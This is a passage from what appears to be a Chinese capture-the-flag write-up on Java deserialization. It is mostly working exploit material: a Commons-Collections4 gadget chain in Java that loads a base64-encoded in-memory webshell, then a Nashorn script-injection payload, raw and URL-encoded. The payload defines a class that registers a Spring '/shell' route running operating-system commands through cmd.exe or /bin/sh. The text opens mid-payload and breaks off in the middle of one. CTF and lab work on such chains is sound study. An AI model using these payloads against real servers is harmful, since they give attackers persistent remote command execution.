A1ZAxIlU1kEEiZTWQUZBFO3ACc6BqcAH7sAJFkGvQANWQMSKFNZBBIpU1kFGQRTtwAnOga7ACpZGQa2ACu2ACy3AC0SLrYALzoHGQe2ADCZAAsZB7YAMacABRkFOgUZB7YAMi0ZBbYAMy22ADQttgA1pwAOOgUsEQGUuQA3AgCxAAEAKwC3ALoANgADAD0AAABKABIAAAAnAA0AKAAaACkAIQAqACsALAAvAC4APwAvAF4AMQB6ADMAkAA0AKQANQCpADYArwA3ALMAOAC3ADsAugA5ALwAOgDFADwAPgAAAGYACgBbAAMAVgBXAAYALwCIAFgAUwAFAHoAPQBWAFcABgCQACcAWQBaAAcAvAAJAFsAXAAFAAAAxgA&#x2F;AEAAAAANALkAXQBeAAEAGgCsAF8AYAACACEApQBhAGIAAwArAJsAYwBTAAQAZAAAAEUABv8AXgAGBwBlBwBmBwBnBwBoBwBpBwBpAAD8ABsHAGr8ACUHAGtBBwBp&#x2F;wAXAAUHAGUHAGYHAGcHAGgHAGkAAQcAbAoATgAAAAQAAQA2AAEAbQBuAAMAPAAAAD8AAAADAAAAAbEAAAACAD0AAAAGAAEAAABAAD4AAAAgAAMAAAABAD8AQAAAAAAAAQBvAHAAAQAAAAEAcQByAAIATgAAAAQAAQBzAFQAAAAJAgBvAAAAcQAAAAEAbQB0AAMAPAAAAEkAAAAEAAAAAbEAAAACAD0AAAAGAAEAAABEAD4AAAAqAAQAAAABAD8AQAAAAAAAAQBvAHAAAQAAAAEAdQB2AAIAAAABAHcAeAADAE4AAAAEAAEAcwBUAAAADQMAbwAAAHUAAAB3AAAACQB5AHoAAwA8AAAAQQACAAIAAAAJuwAIWbcAOEyxAAAAAgA9AAAACgACAAAARwAIAEgAPgAAABYAAgAAAAkAewB8AAAACAABAH0AQAABAE4AAAAEAAEANgBUAAAABQEAewAAAAEAfgAAAAIAfw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>\n\n<p>然后构造cc4的链子</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections4.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javassist.ClassPool;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.xml.transform.Templates;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.Files;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.Paths;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Base64;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.PriorityQueue;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CC4</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//byte[] code = Files.readAllBytes(Paths.get(&quot;C:\\\\Users\\\\cys\\\\Desktop/Calc.class&quot;));</span></span><br><span class=\"line\">        <span class=\"comment\">//byte[] code = ClassPool.getDefault().get(&quot;shell&quot;).toBytecode();</span></span><br><span class=\"line\">        <span class=\"keyword\">byte</span>[] code = Base64.getDecoder().decode(<span class=\"string\">&quot;yv66vgAAADQA7QoAOQCACg...&quot;</span>);  <span class=\"comment\">//内存马的base64</span></span><br><span class=\"line\">        TemplatesImpl templates = <span class=\"keyword\">new</span> TemplatesImpl();</span><br><span class=\"line\"></span><br><span class=\"line\">        setFieldValue(templates, <span class=\"string\">&quot;_bytecodes&quot;</span>, <span class=\"keyword\">new</span> <span class=\"keyword\">byte</span>[][]&#123;code&#125;);</span><br><span class=\"line\">        setFieldValue(templates, <span class=\"string\">&quot;_name&quot;</span>, <span class=\"string\">&quot;aaa&quot;</span>);</span><br><span class=\"line\">        setFieldValue(templates,<span class=\"string\">&quot;_tfactory&quot;</span>, <span class=\"keyword\">new</span> TransformerFactoryImpl());</span><br><span class=\"line\"></span><br><span class=\"line\">        InstantiateTransformer instantiateTransformer = <span class=\"keyword\">new</span> InstantiateTransformer(<span class=\"keyword\">new</span> Class[]&#123;Templates.class&#125;, <span class=\"keyword\">new</span> Object[]&#123;templates&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">        Transformer[] transformers = <span class=\"keyword\">new</span> Transformer[]&#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class=\"line\">                <span class=\"comment\">//instantiateTransformer</span></span><br><span class=\"line\">                <span class=\"keyword\">new</span> InstantiateTransformer(<span class=\"keyword\">new</span> Class[]&#123;Templates.class&#125;, <span class=\"keyword\">new</span> Object[]&#123;templates&#125;)</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        ChainedTransformer chainedTransformer = <span class=\"keyword\">new</span> ChainedTransformer(transformers);</span><br><span class=\"line\"></span><br><span class=\"line\">        TransformingComparator comparator = <span class=\"keyword\">new</span> TransformingComparator(chainedTransformer);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//PriorityQueue 实例</span></span><br><span class=\"line\">        PriorityQueue priorityQueue = <span class=\"keyword\">new</span> PriorityQueue(<span class=\"number\">2</span>);</span><br><span class=\"line\">        <span class=\"comment\">//先设置为正常变量值，后面可以通过setFieldValue修改</span></span><br><span class=\"line\">        priorityQueue.add(<span class=\"number\">1</span>);</span><br><span class=\"line\">        priorityQueue.add(<span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//反射设置 Field</span></span><br><span class=\"line\">        Object[] objects = <span class=\"keyword\">new</span> Object[]&#123;templates,<span class=\"number\">1</span>&#125;;</span><br><span class=\"line\">        setFieldValue(priorityQueue, <span class=\"string\">&quot;queue&quot;</span>, objects);</span><br><span class=\"line\">        setFieldValue(priorityQueue, <span class=\"string\">&quot;comparator&quot;</span>, comparator);</span><br><span class=\"line\"></span><br><span class=\"line\">        serialize(priorityQueue);</span><br><span class=\"line\">        <span class=\"comment\">//unserialize(&quot;ser.bin&quot;);</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">setFieldValue</span><span class=\"params\">(Object object, String fieldName, Object value)</span> <span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        Field field = object.getClass().getDeclaredField(fieldName);</span><br><span class=\"line\">        field.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        field.set(object, value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">          ByteArrayOutputStream baos = <span class=\"keyword\">new</span> ByteArrayOutputStream();</span><br><span class=\"line\">          ObjectOutputStream oos = <span class=\"keyword\">new</span> ObjectOutputStream(baos);</span><br><span class=\"line\">          oos.writeObject(obj);</span><br><span class=\"line\">          oos.close();</span><br><span class=\"line\">          System.out.println(<span class=\"keyword\">new</span> String(Base64.getEncoder().encode(baos.toByteArray())));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Object <span class=\"title\">unserialize</span><span class=\"params\">(String Filname)</span> <span class=\"keyword\">throws</span> Exception, ClassNotFoundException </span>&#123;</span><br><span class=\"line\">        FileInputStream fis = <span class=\"keyword\">new</span> FileInputStream(Filname);</span><br><span class=\"line\">        ObjectInputStream ois = <span class=\"keyword\">new</span> ObjectInputStream(fis);</span><br><span class=\"line\">        Object obj = ois.readObject();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> obj;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-chall/image-20221029145012594.png\" alt=\"image-20221029145012594\"></p>\n<p>FLAG：flag{6b129735-a3ed-426f-b14e-21505afb384d}</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$&#123;script:nashorn:var clazz &#x3D; java.security.SecureClassLoader.class;var method &#x3D; clazz.getSuperclass().getDeclaredMethod(&#39;defineClass&#39;, &#39;anything&#39;.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);method.setAccessible(true);var classBytes &#x3D; &#39;yv66vgAAADQA7QoAOQCACgCBAIIIAIMLAIQAhQcAhgcAhwsABQCIBwCJCABVBwCKCgAKAIsHAIwHAI0IAI4KAAwAjwcAkAcAkQoAEACSBwCTCgATAJQIAJUKAAgAlgoABgCXBwCYCgAYAJkKABgAmgsAmwCcCABjCwCdAJ4IAJ8IAKAKAKEAogoADQCjCACkCgANAKUHAKYIAKcIAKgKACQAjwgAqQgAqgcAqwoAJACsCgCtAK4KACoArwgAsAoAKgCxCgAqALIKACoAswoAKgC0CgC1ALYKALUAtwoAtQC0BwC4CwCbALkKAAgAgAcAugEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAHTHBvY18xOwEAB2NvbnRleHQBADdMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9XZWJBcHBsaWNhdGlvbkNvbnRleHQ7AQAVbWFwcGluZ0hhbmRsZXJNYXBwaW5nAQBUTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9hbm5vdGF0aW9uL1JlcXVlc3RNYXBwaW5nSGFuZGxlck1hcHBpbmc7AQAGbWV0aG9kAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAN1cmwBAEhMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhdHRlcm5zUmVxdWVzdENvbmRpdGlvbjsBAAJtcwEATkxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uOwEABGluZm8BAD9Mb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbzsBABJpbmplY3RUb0NvbnRyb2xsZXIBAApFeGNlcHRpb25zBwC7BwC8AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQADdG1wAQASTGphdmEvbGFuZy9TdHJpbmc7AQAQTWV0aG9kUGFyYW1ldGVycwEABHRlc3QBAAFwAQAaTGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcjsBAAFvAQABYwEAE0xqYXZhL3V0aWwvU2Nhbm5lcjsBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEABndyaXRlcgEAFUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAA2NtZAEADVN0YWNrTWFwVGFibGUHAIkHAL0HAL4HAL8HAI0HAKYHAKsHALgBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwDAAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABdAEAClNvdXJjZUZpbGUBAApwb2NfMS5qYXZhDAA6ADsHAMEMAMIAwwEAOW9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLnNlcnZsZXQuRGlzcGF0Y2hlclNlcnZsZXQuQ09OVEVYVAcAxAwAxQDGAQA1b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9XZWJBcHBsaWNhdGlvbkNvbnRleHQBAFJvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvYW5ub3RhdGlvbi9SZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nDADHAMgBAAVwb2NfMQEAD2phdmEvbGFuZy9DbGFzcwwAyQDKAQBGb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhdHRlcm5zUmVxdWVzdENvbmRpdGlvbgEAEGphdmEvbGFuZy9TdHJpbmcBAAYvc2hlbGwMADoAegEATG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0TWV0aG9kc1JlcXVlc3RDb25kaXRpb24BADVvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9iaW5kL2Fubm90YXRpb24vUmVxdWVzdE1ldGhvZAwAOgDLAQA9b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbwwAOgDMAQADeHh4DAA6AFEMAM0AzgEAQG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9TZXJ2bGV0UmVxdWVzdEF0dHJpYnV0ZXMMAM8A0AwA0QDSBwC+DADTANQHAL0MANUA1gEAAAEAB29zLm5hbWUHANcMANgA1gwA2QDaAQADd2luDADbANwBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIBAAdjbWQuZXhlAQACL2MBAAcvYmluL3NoAQACLWMBABFqYXZhL3V0aWwvU2Nhbm5lcgwA3QDeBwDfDADgAOEMADoA4gEAA1xcQQwA4wDkDADlAOYMAOcA2gwA6AA7BwC&#x2F;DADpAFEMAOoAOwEAE2phdmEvbGFuZy9FeGNlcHRpb24MAOsA7AEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAE2phdmEvaW8vUHJpbnRXcml0ZXIBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BADxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvUmVxdWVzdENvbnRleHRIb2xkZXIBABhjdXJyZW50UmVxdWVzdEF0dHJpYnV0ZXMBAD0oKUxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvUmVxdWVzdEF0dHJpYnV0ZXM7AQA5b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RBdHRyaWJ1dGVzAQAMZ2V0QXR0cmlidXRlAQAnKExqYXZhL2xhbmcvU3RyaW5nO0kpTGphdmEvbGFuZy9PYmplY3Q7AQAHZ2V0QmVhbgEAJShMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL09iamVjdDsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQA7KFtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvYmluZC9hbm5vdGF0aW9uL1JlcXVlc3RNZXRob2Q7KVYBAfYoTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9QYXR0ZXJuc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0TWV0aG9kc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9QYXJhbXNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vSGVhZGVyc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9Db25zdW1lc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9Qcm9kdWNlc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0Q29uZGl0aW9uOylWAQAPcmVnaXN0ZXJNYXBwaW5nAQBuKExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvO0xqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7KVYBAApnZXRSZXF1ZXN0AQApKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAtnZXRSZXNwb25zZQEAKigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAFY2xvc2UBAAV3cml0ZQEABWZsdXNoAQAJc2VuZEVycm9yAQAEKEkpVgAhAAgAOQAAAAAABgABADoAOwACADwAAAEFAAkACAAAAHEqtwABuAACEgMDuQAEAwDAAAVMKxIGuQAHAgDAAAZNEggSCQO9AAq2AAtOuwAMWQS9AA1ZAxIOU7cADzoEuwAQWQO9ABG3ABI6BbsAE1kZBBkFAQEBAQG3ABQ6BrsACFkSFbcAFjoHLBkGGQcttgAXsQAAAAIAPQAAACoACgAAABYABAAYABMAGQAfABoAKwAbAD0AHABKAB0AXAAeAGcAHwBwACAAPgAAAFIACAAAAHEAPwBAAAAAEwBeAEEAQgABAB8AUgBDAEQAAgArAEYARQBGAAMAPQA0AEcASAAEAEoAJwBJAEoABQBcABUASwBMAAYAZwAKAE0AQAAHAE4AAAAGAAIATwBQAAEAOgBRAAIAPAAAAD0AAQACAAAABSq3AAGxAAAAAgA9AAAACgACAAAAIgAEACQAPgAAABYAAgAAAAUAPwBAAAAAAAAFAFIAUwABAFQAAAAFAQBSAAAAAQBVADsAAgA8AAAB4QAGAAgAAADGuAACwAAYwAAYtgAZTLgAAsAAGMAAGLYAGk0suQAbAQBOKxIcuQAdAgA6BBIeOgUSH7gAILYAIRIitgAjmQAiuwAkWQa9AA1ZAxIlU1kEEiZTWQUZBFO3ACc6BqcAH7sAJFkGvQANWQMSKFNZBBIpU1kFGQRTtwAnOga7ACpZGQa2ACu2ACy3AC0SLrYALzoHGQe2ADCZAAsZB7YAMacABRkFOgUZB7YAMi0ZBbYAMy22ADQttgA1pwAOOgUsEQGUuQA3AgCxAAEAKwC3ALoANgADAD0AAABKABIAAAAnAA0AKAAaACkAIQAqACsALAAvAC4APwAvAF4AMQB6ADMAkAA0AKQANQCpADYArwA3ALMAOAC3ADsAugA5ALwAOgDFADwAPgAAAGYACgBbAAMAVgBXAAYALwCIAFgAUwAFAHoAPQBWAFcABgCQACcAWQBaAAcAvAAJAFsAXAAFAAAAxgA&#x2F;AEAAAAANALkAXQBeAAEAGgCsAF8AYAACACEApQBhAGIAAwArAJsAYwBTAAQAZAAAAEUABv8AXgAGBwBlBwBmBwBnBwBoBwBpBwBpAAD8ABsHAGr8ACUHAGtBBwBp&#x2F;wAXAAUHAGUHAGYHAGcHAGgHAGkAAQcAbAoATgAAAAQAAQA2AAEAbQBuAAMAPAAAAD8AAAADAAAAAbEAAAACAD0AAAAGAAEAAABAAD4AAAAgAAMAAAABAD8AQAAAAAAAAQBvAHAAAQAAAAEAcQByAAIATgAAAAQAAQBzAFQAAAAJAgBvAAAAcQAAAAEAbQB0AAMAPAAAAEkAAAAEAAAAAbEAAAACAD0AAAAGAAEAAABEAD4AAAAqAAQAAAABAD8AQAAAAAAAAQBvAHAAAQAAAAEAdQB2AAIAAAABAHcAeAADAE4AAAAEAAEAcwBUAAAADQMAbwAAAHUAAAB3AAAACQB5AHoAAwA8AAAAQQACAAIAAAAJuwAIWbcAOEyxAAAAAgA9AAAACgACAAAARwAIAEgAPgAAABYAAgAAAAkAewB8AAAACAABAH0AQAABAE4AAAAEAAEANgBUAAAABQEAewAAAAEAfgAAAAIAfw&#x3D;&#x3D;&#39;;var bytes &#x3D; java.util.Base64.getDecoder().decode(classBytes);var constructor &#x3D; clazz.getDeclaredConstructor();constructor.setAccessible(true);var clz &#x3D; method.invoke(constructor.newInstance(), bytes, 0 , bytes.length);clz.newInstance();&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">data&#x3D;%24%7Bscript%3Anashorn%3Avar%20clazz%20%3D%20java.security.SecureClassLoader.class%3Bvar%20method%20%3D%20clazz.getSuperclass().getDeclaredMethod(&#39;defineClass&#39;%2C%20&#39;anything&#39;.getBytes().getClass()%2C%20java.lang.Integer.TYPE%2C%20java.lang.Integer.TYPE)%3Bmethod.setAccessible(true)%3Bvar%20classBytes%20%3D%20&#39;yv66vgAAADQA7QoAOQCACgCBAIIIAIMLAIQAhQcAhgcAhwsABQCIBwCJCABVBwCKCgAKAIsHAIwHAI0IAI4KAAwAjwcAkAcAkQoAEACSBwCTCgATAJQIAJUKAAgAlgoABgCXBwCYCgAYAJkKABgAmgsAmwCcCABjCwCdAJ4IAJ8IAKAKAKEAogoADQCjCACkCgANAKUHAKYIAKcIAKgKACQAjwgAqQgAqgcAqwoAJACsCgCtAK4KACoArwgAsAoAKgCxCgAqALIKACoAswoAKgC0CgC1ALYKALUAtwoAtQC0BwC4CwCbALkKAAgAgAcAugEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAHTHBvY18xOwEAB2NvbnRleHQBADdMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9XZWJBcHBsaWNhdGlvbkNvbnRleHQ7AQAVbWFwcGluZ0hhbmRsZXJNYXBwaW5nAQBUTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9hbm5vdGF0aW9uL1JlcXVlc3RNYXBwaW5nSGFuZGxlck1hcHBpbmc7AQAGbWV0aG9kAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAN1cmwBAEhMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhdHRlcm5zUmVxdWVzdENvbmRpdGlvbjsBAAJtcwEATkxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uOwEABGluZm8BAD9Mb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbzsBABJpbmplY3RUb0NvbnRyb2xsZXIBAApFeGNlcHRpb25zBwC7BwC8AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQADdG1wAQASTGphdmEvbGFuZy9TdHJpbmc7AQAQTWV0aG9kUGFyYW1ldGVycwEABHRlc3QBAAFwAQAaTGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcjsBAAFvAQABYwEAE0xqYXZhL3V0aWwvU2Nhbm5lcjsBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEABndyaXRlcgEAFUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAA2NtZAEADVN0YWNrTWFwVGFibGUHAIkHAL0HAL4HAL8HAI0HAKYHAKsHALgBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwDAAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRv